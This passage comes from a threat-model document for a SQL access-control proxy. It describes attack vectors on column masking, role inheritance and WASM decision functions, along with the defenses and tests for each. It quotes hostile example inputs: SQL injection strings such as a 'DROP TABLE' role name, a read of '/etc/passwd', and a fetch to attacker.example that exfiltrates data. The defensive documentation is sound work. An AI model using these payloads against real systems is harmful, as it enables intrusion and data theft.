**Vector**: User aliases a table (e.g. `SELECT * FROM customers AS c`) hoping the alias causes the policy matcher to miss the table and leak denied or masked columns. A naive implementation matching on the alias qualifier (`c`) instead of the real table name (`customers`) would return raw values.

**Attacks**:
  1. **Star projection through alias on deny target** — `SELECT * FROM customers AS c` where `email` is denied on `customers`; must return only non-denied columns, regardless of the alias
  2. **Explicit alias-qualified reference to denied column** — `SELECT c.email FROM customers AS c`; must error (column not found / denied), not return raw values
  3. **Alias-qualified reference to masked column** — `SELECT c.email FROM customers AS c` where `email` is masked; must return the masked value, not the raw email

**Defense**: Column deny is enforced at visibility level — denied columns are removed from the per-user schema before query planning, so they never appear in `SELECT *` expansion or alias-qualified references regardless of alias. Column mask is enforced at the `TableScan` level via `apply_column_mask_at_scan`, which operates on the real `TableScan` table name before any `SubqueryAlias` wrapping can change the qualifier. The alias is a label applied *above* the scan in the plan tree; the mask and deny rewrites happen *at* the scan.

**Tests**:
  - `policy_enforcement::tc_join_03a_alias_column_deny` (integration) — attacks 1, 2
  - `policy_enforcement::tc_join_03b_alias_column_mask` (integration) — attack 3

---

### 29. row_filter alone does not grant visibility in policy_required mode

**Vector**: Datasource is configured with `access_mode = "policy_required"`. A user has a `row_filter` (or `column_mask`) policy assigned to a table but no `column_allow` policy. An incorrect implementation could interpret "there's a policy on this table" as permission to see the table, bypassing the zero-trust requirement that visibility must be explicitly granted.

**Attacks**:
  1. **row_filter-only assignment, policy_required mode** — user runs `SELECT ... FROM information_schema.tables` or `SELECT * FROM users` against a table that has only a `row_filter` attached in `policy_required` mode

**Defense**: `compute_user_visibility()` only adds a table to `visible_tables` when at least one `column_allow` policy matches it. `row_filter` and `column_mask` are *refinement* policies — they shape what a user sees after visibility is granted, but do not grant visibility on their own. Without a `column_allow`, the table is excluded from the per-user `SessionContext` catalog and is invisible in both `information_schema` queries and direct table references. The catalog admin API continues to show the table (admin view is unfiltered).

**Tests**:
  - `policy_enforcement::tc_zt_04_sidebar_sync_row_filter_only` (integration) — attack 1

---

### 30. CTE wrapping does not bypass column deny, column mask, or column allow

**Vector**: User wraps a table in a Common Table Expression hoping the CTE's `SubqueryAlias` node changes the column qualifier from the real table name to the CTE alias, causing column-level policy patterns to miss at the top-level projection.

**Attacks**:
  1. **CTE with column_deny** — `WITH t AS (SELECT * FROM users) SELECT ssn FROM t` where `ssn` is denied; `SELECT *` inside the CTE must exclude `ssn`, and explicit `SELECT ssn FROM t` must error (column not in schema)
  2. **CTE with column_mask** — `WITH t AS (SELECT * FROM users) SELECT ssn FROM t` where `ssn` is masked; the query must return the masked value, not the raw value
  3. **CTE with column_allow (policy_required mode)** — allow only `id, name`; `WITH t AS (SELECT * FROM users) SELECT ssn FROM t` must error (column not in allow list)

**Defense**: All three column-level policies enforce below the CTE boundary: (1) `column_deny` is enforced at visibility level by `compute_user_visibility` / `build_user_context` — denied columns are removed from the per-user schema before query planning, so they never enter the CTE's output schema; (2) `column_mask` is enforced at `TableScan` level via `apply_column_mask_at_scan`, which injects a mask `Projection` directly above the scan before any `SubqueryAlias` node is constructed; (3) `column_allow` in `policy_required` mode restricts the user's `SessionContext` schema to the allowed column set, so non-allowed columns are absent from the CTE's output. All three mechanisms operate at or below the scan, so alias qualifier changes at higher plan nodes cannot bypass them.

**Previously**: `column_mask` was enforced only at the top-level `Projection` via `apply_projection_qualified`. CTE nodes (`SubqueryAlias`) changed the DFSchema qualifier from the real table name (`users`) to the CTE alias (`t`), so the top-level matcher (which compared against the real table name) silently failed to apply the mask. Raw values leaked through any CTE wrapping. The fix added `apply_column_mask_at_scan` — a `transform_up` pass that injects the mask `Projection` directly above each `TableScan`, using `alias_qualified` to preserve the table qualifier on the masked column. Masks are cleared from `column_masks` after scan-level application to prevent double-masking.

**Tests**:
  - `policy_enforcement::tc_plan_01a_cte_column_deny` (integration) — attack 1
  - `policy_enforcement::tc_plan_01b_cte_column_mask` (integration) — attack 2
  - `policy_enforcement::tc_plan_01c_cte_column_allow` (integration) — attack 3

---

### 31. Subquery-in-FROM wrapping does not bypass column deny, column mask, or column allow

**Vector**: User wraps a table in a subquery-in-FROM hoping the subquery's `SubqueryAlias` node changes the qualifier from the real table name to the subquery alias, causing column-level policy patterns to miss at the top-level projection.

**Attacks**:
  1. **Subquery with column_deny** — `SELECT sub.ssn FROM (SELECT * FROM users) AS sub` where `ssn` is denied; `SELECT *` inside the subquery must exclude `ssn`, and explicit `sub.ssn` must error
  2. **Subquery with column_mask** — same shape, `ssn` masked; the query must return the masked value
  3. **Subquery with column_allow (policy_required mode)** — allow only `id, name`; `sub.ssn` must error (column not in allow list)

**Defense**: Same as vector 30. All three column-level policies enforce at or below the `TableScan` — before the `SubqueryAlias` node is constructed in the plan tree. Column deny removes columns from the per-user schema at visibility time; column mask injects a mask `Projection` directly above the scan via `apply_column_mask_at_scan`; column allow restricts the schema to the allowed set at connection time. Alias qualifier changes at higher plan nodes cannot bypass any of these.

**Previously**: Same regression as vector 30 — column mask was enforced only at the top-level `Projection`, and the `SubqueryAlias` qualifier change caused the matcher to miss. Raw values leaked through any subquery wrapping. Fixed by adding scan-level mask enforcement (`apply_column_mask_at_scan`), which runs below all alias-changing plan nodes.

**Tests**:
  - `policy_enforcement::tc_plan_02a_subquery_column_deny` (integration) — attack 1
  - `policy_enforcement::tc_plan_02b_subquery_column_mask` (integration) — attack 2
  - `policy_enforcement::tc_plan_02c_subquery_column_allow` (integration) — attack 3

---

### 32. Row filter and column mask on the same column

**Vector**: A `row_filter` and a `column_mask` are configured on the same column (e.g. `ssn`). The row filter's predicate (`ssn != '000-00-0000'`) must evaluate against raw values, not masked values — otherwise a row that should be excluded (because its raw `ssn` equals the sentinel) passes the filter because the masked value (`'***-**-0000'`) doesn't match, leaking that row.

**Attacks**:
  1. **Filter predicate evaluated on masked value** — row filter `ssn != '000-00-0000'`, mask replaces `ssn` with `'***-**-XXXX'`; a row with raw `ssn = '000-00-0000'` must be excluded (filter sees raw) and the remaining rows must be masked in the output

**Defense**: The enforcement order in `apply_policies` is (1) `apply_column_mask_at_scan`, (2) `apply_row_filters`, (3) `apply_projection_qualified`. Both mask and filter injection use `transform_up` on `TableScan`. Because mask runs first, the plan tree is built bottom-up as `Projection(mask) → Filter(row_filter) → TableScan`. At execution time data flows scan → filter (raw data) → mask — so the row filter always evaluates against unmasked values, while the output projection still sees masked values.

**Previously**: `apply_row_filters` ran before `apply_column_mask_at_scan`. `transform_up` produced `Filter(row_filter) → Projection(mask) → TableScan`, where data flowed scan → mask → filter — so the filter saw masked values. A predicate like `ssn != '000-00-0000'` matched against the masked sentinel `'***-**-0000'` instead of the raw value, incorrectly including rows that should have been filtered out.

**Tests**:
  - `policy_enforcement::row_filter_and_column_mask_same_column` (integration) — attack 1

---

## RBAC (Role-Based Access Control) — Vectors 33–45

### 33. Role-based datasource access grants connection

**Vector**: User has no direct `data_source_access` entry but is a member of a role that has role-scoped access. The connection must succeed, resolving access through the user's role memberships rather than relying on a direct user-to-datasource grant.

**Attacks**:
  1. **Role-only access path** — user with no direct `data_source_access` row, member of a role that has a role-scoped entry; `connect_as(user, ds)` must succeed

**Defense**: `resolve_datasource_access()` in `role_resolver.rs` checks all three scopes in order: user-direct (`scope = 'user'`), role-based (`scope = 'role'` with any of the user's resolved role IDs), and all-scoped (`scope = 'all'`). Access is granted if any scope matches.

**Tests**:
  - `policy_enforcement::rbac_02_role_based_access_connect_succeeds` (integration) — attack 1

---

### 34. Inherited role datasource access

**Vector**: User is a member of a child role. The child role has no direct datasource grant, but its parent role does. Access must be granted via inheritance — a naive implementation that only checks directly-assigned roles would reject the connection.

**Attacks**:
  1. **Access via inherited parent role** — user in child role C, which inherits from parent role P, where P has datasource access and C does not

**Defense**: `resolve_user_roles()` performs a BFS from the user's direct roles upward through the `role_inheritance` edges, collecting all reachable active ancestor role IDs. `resolve_datasource_access()` then checks the full resolved set against `data_source_access` entries scoped to any of those roles, so parent access is found transitively.

**Tests**:
  - `policy_enforcement::rbac_03_inherited_role_access_connect_succeeds` (integration) — attack 1

---

### 35. Cycle detection in role inheritance

**Vector**: Admin attempts to create a circular inheritance chain (e.g., A→B→C→A) to cause infinite loops or stack overflow in role resolution.

**Attacks**:
  1. **Three-role cycle** — create roles A→B, B→C, then attempt C→A; must return HTTP 422

**Defense**: `detect_cycle()` in `role_resolver.rs` runs a BFS from the proposed parent upward through existing inheritance edges before any insertion. If the child is reachable from the parent, the insert is rejected with HTTP 422. The detect-and-insert pair runs inside a single SQLite transaction (see vector 48), so SQLite's single-writer serialization prevents two concurrent `add_parent` calls from each passing cycle detection independently and together creating a cycle.

**Tests**:
  - `policy_enforcement::rbac_15_cycle_detection_abc` (integration) — attack 1

---

### 36. Self-referential role inheritance

**Vector**: Admin sets a role as its own parent — a trivial cycle of length 1. A cycle detector that only looks at existing edges (not the edge being inserted) would miss this case.

**Attacks**:
  1. **Role parents itself** — `add_parent(role_id, role_id)` must return HTTP 422

**Defense**: `detect_cycle()` short-circuits on `parent_id == child_id` before running the BFS. The self-edge case is caught as the first check.

**Tests**:
  - `policy_enforcement::rbac_16_self_referential_rejected` (integration) — attack 1

---

### 37. Inheritance depth cap at 10 levels

**Vector**: Admin creates a role inheritance chain deeper than 10 levels to cause performance degradation, stack overflow, or unbounded BFS work during role resolution on every query.

**Attacks**:
  1. **Depth-10 chain** — a chain of exactly 10 inheritance edges must be accepted
  2. **Depth-11 chain** — adding one more edge to make the chain 11 deep must be rejected with HTTP 422

**Defense**: `resolve_user_roles()` caps BFS traversal at depth 10 at runtime. `check_inheritance_depth()` is invoked before each `add_parent` insertion: it computes the total chain depth through the new edge (depth above the proposed parent + 1 + depth below the proposed child — see vector 45d) and rejects the insert if the total would exceed 10.

**Tests**:
  - `policy_enforcement::rbac_17_depth_cap` (integration) — attacks 1, 2

---

### 38. Deny-wins across roles

**Vector**: User is a member of two roles with conflicting policies on the same column — Role A denies the column via `column_deny`, while Role B allows it via `column_allow`. A permit-first resolver could return the allow verdict, leaking data that the deny was intended to block.

**Attacks**:
  1. **Conflicting deny+allow from different roles** — user assigned to both Role A (`column_deny` on `ssn`) and Role B (`column_allow` including `ssn`); `SELECT ssn FROM customers` must be denied

**Defense**: Deny-type policies always take precedence regardless of their source. `compute_user_visibility` and `PolicyEffects::collect` both apply deny effects (column_deny, table_deny) after resolving all effective assignments from all scopes, so a deny from *any* role immediately removes the column (or table) from the user's reachable set. The permit from another role cannot override it.

**Tests**:
  - `policy_enforcement::rbac_14_deny_wins_over_allow_from_different_roles` (integration) — attack 1

---

### 39. Policy assignment scope mismatch

**Vector**: An API caller sends a policy-assignment request with inconsistent scope/ID combinations — e.g., both `user_id` and `role_id` set, or `scope='user'` without a `user_id`. An under-validating implementation could create an ambiguous assignment that matches unintended scopes at query time.

**Attacks**:
  1. **Both user_id and role_id set** — request with `scope='user'`, `user_id=X`, and `role_id=Y`; must return HTTP 400
  2. **scope=user with role_id** — request with `scope='user'` and `role_id=Y` (no `user_id`); must return HTTP 400
  3. **scope=role with user_id** — request with `scope='role'` and `user_id=X` (no `role_id`); must return HTTP 400
  4. **scope=all with IDs** — request with `scope='all'` and either ID set; must return HTTP 400

**Defense**: `assign_policy` validates scope constraints at the API layer: `scope='user'` requires exactly `user_id` (no `role_id`), `scope='role'` requires exactly `role_id` (no `user_id`), and `scope='all'` requires neither. Any mismatch returns HTTP 400 before the assignment is persisted.

**Tests**:
  - `policy_enforcement::rbac_70_both_user_and_role_rejected` (integration) — attack 1
  - `policy_enforcement::rbac_71_scope_user_with_role_id_rejected` (integration) — attack 2
  - `policy_enforcement::rbac_72_scope_role_with_user_id_rejected` (integration) — attack 3
  - `policy_enforcement::rbac_73_scope_all_with_ids_rejected` (integration) — attack 4

---

### 40. Role deactivation immediately removes access

**Vector**: Admin deactivates a role (sets `is_active = false`). Members of that role must lose all policies and datasource access derived from the role immediately — on their very next query — without requiring reconnection. A lazy approach that waited for reconnection would allow continued access after deactivation.

**Attacks**:
  1. **Query after role deactivation** — user in role R runs a successful query, admin deactivates R, user's next query must fail or return empty (per `policy_required` mode) without any reconnection

**Defense**: `resolve_user_roles()` BFS skips inactive roles entirely, so derived policies and access grants disappear from the resolved set immediately. Deactivation in the `PATCH /roles/{id}` handler triggers `policy_hook.invalidate_user()` and `proxy_handler.rebuild_contexts_for_user()` for every affected member (resolved via `resolve_all_role_members`), forcing a `SessionContext` rebuild on all active connections before the next query is processed.

**Tests**:
  - `policy_enforcement::rbac_42_deactivate_role_loses_policies` (integration) — attack 1

---

### 41. Deactivated role in the middle of an inheritance chain breaks the chain

**Vector**: In a chain A→B→C, admin deactivates B. Members of A must lose access to C's policies (because their inheritance path went through B). A BFS that skipped inactive roles only as a filter on the final result — but still traversed their edges — would incorrectly reach C through the deactivated B.

**Attacks**:
  1. **Transitive access through deactivated middle role** — user in A, chain A→B→C, B deactivated; C's policies must no longer apply to A's members

**Defense**: `resolve_user_roles()` stops BFS traversal *at* inactive roles, not after them. When B is deactivated, the BFS from A's direct roles does not enqueue B's parents at all, so C becomes unreachable. Deactivation triggers a rebuild for all affected members (see vector 40).

**Tests**:
  - `policy_enforcement::rbac_43_deactivate_middle_role_breaks_chain` (integration) — attack 1

---

### 42. Template variables always resolve from the user, not the role

**Vector**: A `row_filter` policy with `{user.tenant}` is assigned to a role rather than directly to a user. When multiple users in that role connect, each user's filter must resolve against their own `tenant` attribute — not against a shared role value, and not against an arbitrary user who happened to create or edit the policy.

**Attacks**:
  1. **Per-user template resolution via role-assigned policy** — users U1 (tenant=acme) and U2 (tenant=globex) both belong to role R; policy P with `tenant = {user.tenant}` is assigned to R; U1's queries must return only acme rows and U2's only globex rows

**Defense**: Template variable substitution in `PolicyHook::handle_query` uses the authenticated user's identity and `attributes` column at query time, not any role metadata. Roles have no attributes of their own — the `role` entity has only a name, description, and enable flag. The substitution path is the same whether the policy was assigned to the user directly, to the role, or to `scope='all'`.

**Tests**:
  - `policy_enforcement::rbac_24_row_filter_via_role_template_vars` (integration) — attack 1

---

### 43. SQL injection via role name

**Vector**: Admin (or attacker with role-create privileges) creates a role with a name containing SQL syntax, hoping the name is interpolated into a query somewhere and allows injection.

**Attacks**:
  1. **SQL-fragment in role name** — create role named `"; DROP TABLE role; --"` or `'OR '1'='1`; must return HTTP 422 (invalid characters)

**Defense**: Role name validation at the API layer restricts names to `[a-zA-Z0-9_.-]`, 3–50 characters, and must start with a letter. Any input containing SQL metacharacters (quotes, semicolons, spaces, etc.) is rejected before the value touches any query builder. Additionally, all database access in the codebase uses parameterized queries via SeaORM, so even if a malformed name somehow reached a query, it would be bound as a parameter rather than concatenated.

**Tests**:
  - `policy_enforcement::rbac_34_invalid_role_name_chars` (integration) — attack 1

---

### 44. Diamond inheritance deduplication

**Vector**: A user is reachable to the same policy via two distinct inheritance paths (e.g., user → A, A inherits from both B and C, both B and C inherit from D, policy P assigned to D). A naive resolver would apply P twice, potentially multiplying the effect of combinable policies or exposing internal ordering that shouldn't be observable.

**Attacks**:
  1. **Policy reachable via two paths in diamond hierarchy** — user in A, A→B→D and A→C→D, policy P on D; P must apply exactly once regardless of the two reachable paths

**Defense**: `resolve_effective_assignments()` in `role_resolver.rs` deduplicates resolved assignments by `policy_id`, keeping the assignment with the lowest `priority` value when duplicates exist. Deduplication happens once at resolution time; downstream code (`PolicyEffects::collect`, visibility computation) sees each policy at most once.

**Tests**:
  - `policy_enforcement::rbac_18_diamond_no_duplicate_policy` (integration) — attack 1

---

### 45a. Revoked role datasource access must invalidate active connections

**Vector**: Admin revokes a role's access to a datasource via `PUT /datasources/{id}/access/roles` (removing the role from the submitted list). Any user whose access to that datasource came via the revoked role must lose access on their next query. A half-invalidating implementation that only refreshes added roles — but not removed ones — would allow revoked members to continue querying until they disconnected.

**Attacks**:
  1. **Continued access after role revocation** — user U has access to datasource D only through role R; admin removes R from D's role-access list; U's next query must fail

**Defense**: `set_datasource_role_access` in `datasource_handlers.rs` captures `old_role_ids` before deleting the old role-scoped access entries. After `txn.commit()`, it computes `all_affected = old_role_ids ∪ new_role_ids` and calls `policy_hook.invalidate_user()` + `proxy_handler.rebuild_contexts_for_user()` for every member of every affected role (resolved via `resolve_all_role_members`). This forces a `SessionContext` rebuild on active connections *before* the next query, regardless of whether a role was added, removed, or kept. An audit log entry is also written inside the `AuditedTxn`.

**Previously**: `set_datasource_role_access` only invalidated members of newly-added roles. Users who lost access via a removed role could continue querying against their stale `SessionContext` until they voluntarily disconnected. The change was invisible to affected users for arbitrarily long periods.

**Tests**:
  - Structural verification via code review: `set_datasource_role_access` invokes invalidation on `old_role_ids.union(&new_role_ids)`. (See the integration-level rebuild coverage in `rbac_42_deactivate_role_loses_policies` — same rebuild code path.)

---

### 45b. Revoked user datasource access must invalidate and audit

**Vector**: Admin changes the user access list via `PUT /datasources/{id}/users`, removing a user from the list. The removed user must lose access on their next query, and the mutation must be recorded in the admin audit log so the revocation is traceable.

**Attacks**:
  1. **Continued access after user removal** — user U has direct access to datasource D; admin removes U from D's user access list; U's next query must fail
  2. **Unaudited revocation** — the same revocation must produce an `admin_audit_log` entry with `resource_type: "datasource"`, `action: "update"`, and `changes` showing the before/after user-id sets

**Defense**: `set_datasource_users` in `datasource_handlers.rs` captures `old_user_ids` before deleting the old user-scoped access entries. After `txn.commit()`, it invalidates `old_user_ids ∪ new_user_ids` via `policy_hook.invalidate_user()` + `proxy_handler.rebuild_contexts_for_user()` for each. The mutation uses `AuditedTxn`, which writes an audit entry atomically with the access change — so an unaudited commit is impossible (see vector 49).

**Previously**: `set_datasource_users` had no cache invalidation and no audit log call at all. Removed users could continue querying indefinitely against stale `SessionContext` entries, and there was no record in the admin audit log of which admin revoked which user's access.

**Tests**:
  - Structural verification via code review: `set_datasource_users` invokes invalidation on `old_user_ids ∪ new_user_ids` and writes an audit entry via `AuditedTxn`. Rebuild path shares code with `rbac_42_deactivate_role_loses_policies`; audit path is structurally enforced by `AuditedTxn::commit()` requiring at least one queued entry (see vector 49 unit tests).

---

### 45c. Silent rebuild failure must not leave stale SessionContext in place

**Vector**: After a policy or role mutation, `rebuild_contexts_for_datasource` or `rebuild_contexts_for_user` runs in the background to refresh each active connection's `SessionContext`. If the rebuild fails for one connection (upstream database unreachable, transient schema error, etc.), the failure must not leave the stale `SessionContext` in place — otherwise that connection keeps enforcing the old policies, potentially missing a newly-added deny.

**Attacks**:
  1. **Transient rebuild error leaves stale context** — admin adds a new `column_deny` policy; the background rebuild for connection C fails; C's next query must either apply the new policy or fail with "please reconnect" — it must not use the stale pre-deny context

**Defense**: On rebuild failure, the stale connection entry is removed from `conn_store.connection_contexts`. The user's next query then hits a "Session context not found — please reconnect" error, forcing a fresh connection that re-runs `check_access` and `build_user_context` from scratch. This fail-closed pattern ensures stale state cannot silently serve queries.

**Previously**: The error from a failed rebuild was logged but the connection entry was left in place with the old `SessionContext`. The next query used the stale context, potentially missing a just-added deny policy, until the user happened to disconnect.

**Tests**:
  - Structural verification via code review: both `rebuild_contexts_for_datasource` and `rebuild_contexts_for_user` call `conn_store.connection_contexts.remove(&conn_id)` in the error branch.

---

### 45d. Inheritance depth check must account for both sides of the new edge

**Vector**: The depth cap (vector 37) must consider the total chain length through the proposed new edge, not just one side. An implementation that only checked the depth above the parent could accept an edge that creates an 11-level chain because the child has a deep subtree below it that wasn't counted.

**Attacks**:
  1. **Parent has depth 2 above, child has depth 8 below; proposed edge would yield total depth 11** — `add_parent(parent=A, child=B)` where A is 2 levels deep upward and B is 8 levels deep downward; must be rejected (total = 2 + 1 + 8 = 11 > 10)

**Defense**: `add_parent` calls both `check_inheritance_depth` (BFS upward from the proposed parent) and `check_inheritance_depth_down` (BFS downward from the proposed child) and computes `total = depth_above_parent + 1 + depth_below_child`. If the total exceeds 10, the insert is rejected with HTTP 422. Both BFS traversals are capped by the same depth limit so they terminate in bounded time.

**Previously**: `add_parent` only called `check_inheritance_depth` on the proposed parent (upward). It ignored the child's downward subtree entirely, so a parent at depth 2 could adopt a child whose subtree extended to depth 8 — the combined chain was 11 levels deep, but the check only saw 2 + 1 = 3 and accepted the edge. Queries against members of the resulting chain then hit the depth-10 cap at resolution time, producing unpredictable errors or truncated role sets.

**Tests**:
  - `role_resolver::tests::u16_depth_down_chain` (unit) — verifies downward depth calculation on the child subtree
  - `role_resolver::tests::u17_total_depth_check` (unit) — verifies total depth accounting through the new edge (attack 1)

---

### 46. Effective members source annotation must identify the actual direct-member role

**Vector**: The admin UI's Members tab for a parent role lists all effective members reachable through inheritance and annotates each entry with "via role '(name)'" to show how the membership arose. If the annotation names the wrong role, admins make incorrect decisions about where to revoke a membership — removing a user from the wrong role either fails to revoke their access or over-revokes from an unrelated role.

**Attacks**:
  1. **Annotation shows top-level role instead of direct-member role** — parent role `data-analysts`, child role `data-architect` (which inherits from `data-analysts`), user U is a direct member of `data-architect`; when viewing `data-analysts`'s effective members, U's annotation must say "via role 'data-architect'" (the role U is actually a member of), not "via role 'data-analysts'" (the role being viewed)

**Defense**: `resolve_effective_members()` in `role_resolver.rs` performs a BFS downward from the viewed role and annotates each reached member with the `child_id` of the role they are directly a member of — not the `role_id` being viewed, and not the intermediate parent role in the traversal. The source label correctly identifies the single role whose direct membership produces the effective membership.

**Previously**: Both BFS levels in `resolve_effective_members()` used `all_roles.get(&role_id)` (the top-level role being viewed) or `all_roles.get(&current)` (the intermediate parent) for the source-label name lookup, instead of `all_roles.get(&child_id)` (the actual child role). Admins viewing a parent role's members saw annotations pointing at the parent or intermediate roles, misdirecting any subsequent "remove this member" action.

**Tests**:
  - `role_resolver::tests::u13_resolve_all_members` (unit) — verifies BFS downward member collection and source annotation

---

### 45. Role deletion cascade integrity

**Vector**: Deleting a role with active members, inheritance edges, policy assignments, and datasource-access entries must leave no orphaned references. Orphan rows pointing at a deleted `role_id` would cause runtime resolution errors on every affected user's query, effectively breaking access for the survivors.

**Attacks**:
  1. **Delete role with full set of references** — create role R with members, an inheritance edge as both parent and child, a direct datasource-access row, and a role-scoped policy assignment; `DELETE /roles/{id}` must remove R and all referring rows

**Defense**: All foreign-key relationships that reference `role.id` use `ON DELETE CASCADE` in the schema: `role_inheritance` (both `parent_id` and `child_id`), `user_role` (member links), `data_source_access` (when `scope = 'role'`), and `policy_assignment` (when `assignment_scope = 'role'`). The delete handler performs the `DELETE` inside an `AuditedTxn` that records an `Unassign` audit entry for each cascaded policy assignment before the cascade completes (see vector 49).

**Tests**:
  - `policy_enforcement::rbac_19_role_delete_cascades` (integration) — attack 1

---

### 47. Inactive role cannot be granted datasource access

**Vector**: Admin attempts to grant datasource access to an inactive (deactivated) role. If the grant is accepted, the role's access entry sits dormant in `data_source_access` — then the moment anyone reactivates the role, all members unexpectedly gain access to that datasource without any fresh explicit grant decision. This "access time bomb" means reactivation silently re-enables grants that no current admin necessarily authorized.

**Attacks**:
  1. **Grant access to deactivated role** — admin calls `PUT /datasources/{id}/access/roles` including an inactive role; must return HTTP 400 (not 204)

**Defense**: `set_datasource_role_access` validates `is_active` on every role before inserting any access entry. Inactive roles in the submitted list cause the entire request to fail with HTTP 400 before any row is written — the validation runs before the delete-and-insert phase.

**Tests**:
  - `policy_enforcement::rbac_74_set_datasource_role_access_rejects_inactive_role` (integration) — attack 1 (create role, grant access succeeds with 204, deactivate role, second grant attempt returns 400)

---

### 48. TOCTOU in role inheritance cycle detection

**Vector**: Two concurrent `add_parent` requests could each individually pass cycle detection (because neither has seen the other's insert yet) but together produce a cycle when both commit. A non-atomic detect-then-insert is a classic time-of-check-to-time-of-use window.

**Attacks**:
  1. **Concurrent add_parent racing to create a cycle** — request R1 inserts edge A→B while request R2 simultaneously inserts edge B→A; without serialization, both pass the cycle check (neither sees the other's edge) and both commit, creating a cycle

**Defense**: `add_parent` wraps `detect_cycle` + `check_inheritance_depth` + the actual `INSERT` inside a single database transaction. SQLite's single-writer serialization ensures that the second concurrent transaction cannot see partial state — it either sees the first request's insert (and therefore detects the cycle) or waits for the first to commit before beginning its own detection pass. The check-and-insert pair is atomic.

**Tests**:
  - Structural verification: the TOCTOU fix is enforced by the transaction boundary, not by a specific behavioral test. `policy_enforcement::rbac_15_cycle_detection_abc` (vector 35) and `policy_enforcement::rbac_16_self_referential_rejected` (vector 36) cover the detection behavior; the TOCTOU property follows from running those checks inside a serializable transaction.

---

## Decision Functions — Vectors 50–56

### 50. WASM sandbox escape

**Vector**: A decision function with malicious JavaScript attempts to break out of the WASM execution sandbox to read host filesystem, open network connections, execute arbitrary native code, or exfiltrate data from the proxy process. Policy authors can be untrusted in multi-tenant deployments, so the sandbox must hold against hostile code that's allowed to define policies but not to run arbitrary host code.

**Attacks**:
  1. **File I/O attempt** — decision function calls `Deno.readFile('/etc/passwd')` or similar filesystem API
  2. **Network attempt** — decision function calls `fetch('https://attacker.example/...')` to exfiltrate context data
  3. **Unregistered WASM import** — decision function's WASM binary imports a host function not in the provided stub set, attempting to link against something that doesn't exist

**Defense**: wasmtime provides a hardware-enforced memory sandbox — WASM linear memory is isolated, and host calls can only happen through the `Linker` which explicitly registers each allowed import. BetweenRows' `Linker` exposes only WASI preview 1 stubs for stdin/stdout/stderr (`fd_read`, `fd_write`). No filesystem, no network, no process, no clock-with-real-precision, no environment variables. Any import request for an unregistered function causes `Module::instantiate()` to fail before any guest code runs. At the JavaScript level, Javy (the JS runtime compiled to WASM) deliberately excludes `Deno`, `Node`, `fetch`, and similar host-bridging APIs — they're not in the Javy binary, so calling them at guest level produces a plain "undefined is not a function" runtime error, never a host call.

**Tests**: Verified by construction — the Javy binary does not include filesystem/network APIs, and the `Linker` in `wasm.rs` is the single source of allowed imports (inspection-level guarantee). No specific automated test attempts escape because the sandbox boundary is enforced by wasmtime's type system: an unregistered import cannot pass module instantiation.

---

### 51. Fuel exhaustion DoS

**Vector**: A malicious or buggy decision function enters an infinite loop or performs unbounded computation, blocking the query-processing thread and denying service to other users of the proxy.

**Attacks**:
  1. **Infinite loop in decision function** — `while (true) {}` or equivalent; must be caught by fuel metering and dispatched to the policy's `on_error` setting (deny or skip)
  2. **Slow but terminating computation** — a loop of, say, 10^8 iterations that would take many seconds; must either complete within the fuel budget or abort with a fuel-exhaustion trap, never blocking the async runtime for more than the spawn_blocking slot allows

**Defense**: wasmtime fuel metering caps execution at `DEFAULT_FUEL_LIMIT = 1,000,000` WASM instructions (configured in `wasm.rs`). Fuel is decremented on every instruction; on exhaustion, wasmtime raises a fuel-exhaustion trap that `evaluate_wasm` catches as `RuntimeError::ExecutionError`. The policy's `on_error` setting then takes over: `"deny"` fires the policy (fail-secure), `"skip"` skips it. Evaluation itself runs on a `tokio::task::spawn_blocking` thread, so a slow decision function blocks only its own blocking pool slot, not the async runtime — other concurrent queries continue to be processed normally.

**Tests**:
  - `policy_enforcement::df_on_error_deny_fires` (integration) — attack 1 with `on_error = "deny"` (broken WASM triggers the error path, policy fires)
  - `policy_enforcement::df_on_error_skip_does_not_fire` (integration) — attack 1 with `on_error = "skip"` (same broken WASM, policy skips instead)

---

### 52. Cross-policy state leakage between evaluations

**Vector**: A decision function caches state in a WASM global variable, a module-level `let`, or the JavaScript heap. A subsequent evaluation — for a different user, a different query, or a different policy — picks up the residual state and makes an incorrect decision based on the *previous* user's context. This is especially dangerous for tenant-isolation decision functions: user B's policy evaluation could read user A's tenant ID.

**Attacks**:
  1. **Global variable carries over between users** — decision function stores `ctx.session.user.tenant` in a top-level `let` during user A's evaluation; user B's subsequent evaluation reads the stale value instead of their own tenant

**Defense**: `evaluate_wasm` creates a fresh wasmtime `Store` and instantiates a new WASM module instance for every single evaluation call. WASM linear memory, stack, and globals are reset on each instantiation — there is no shared heap between evaluations. The compiled `Module` is cached by `(policy_id, version)` to avoid re-compiling the same bytecode, but the *instance* (which holds runtime state) is never reused across calls.

**Tests**: Structural verification via code review: `evaluate_bytes()` in `decision/wasm.rs` constructs a new `Store` and calls `Module::instantiate()` on every invocation, so there is no retained guest state. The sandbox isolation is a direct property of wasmtime's instance model; no behavioral test is needed to verify it beyond demonstrating that the module cache is keyed on the module, not the instance.

---

### 53. SQL injection via decision function return value

**Vector**: A decision function returns a value crafted to be interpolated into SQL — e.g., a string containing SQL fragments — in the hope that the proxy stringifies the return value and concatenates it into the rewritten query, allowing injection of arbitrary clauses.

**Attacks**:
  1. **String fragment in fire** — decision function returns `{ fire: "1=1; DROP TABLE users" }`; must be rejected at the result-validation stage, not interpolated anywhere
  2. **Object with SQL in nested field** — return `{ fire: true, extra: "OR 1=1" }`; extra fields must be ignored or the shape rejected

**Defense**: The `fire` return value is extracted via `.as_bool()` on the parsed JSON. Only `true` or `false` affect policy behavior — no part of the return value is ever used in SQL construction, interpolation, or rewriting. The policy simply fires or doesn't. If the return shape is not `{ fire: boolean }`, the Javy harness throws before the result reaches `evaluate_wasm`'s caller, and the error propagates as `RuntimeError::InvalidResult`. The two-layer rejection (harness type check + `.as_bool()` strictness) prevents any non-boolean from affecting policy state. The architectural invariant is: decision functions are pure predicates, never data providers.

**Tests**:
  - `decision::wasm::tests::test_validate_bad_return` (unit) — attacks 1, 2 (function returning `{ wrong: "shape" }` fails; function returning `{ fire: 1 }` or `{ fire: "yes" }` fails)

---

### 54. Admin-authored decision function bypassing a deny policy

**Vector**: An admin with policy-write privileges attaches a decision function that always returns `fire: false` to a `table_deny` or `column_deny` policy — effectively disabling the deny without removing the assignment row. The deny appears active in the policy list but never fires, silently granting access. The attacker's goal is to disable protection without leaving an obvious trace.

**Attacks**:
  1. **Inert deny via always-false decision fn** — admin attaches a decision function that returns `{ fire: false }` unconditionally to a `table_deny` on `customers`; the table becomes queryable

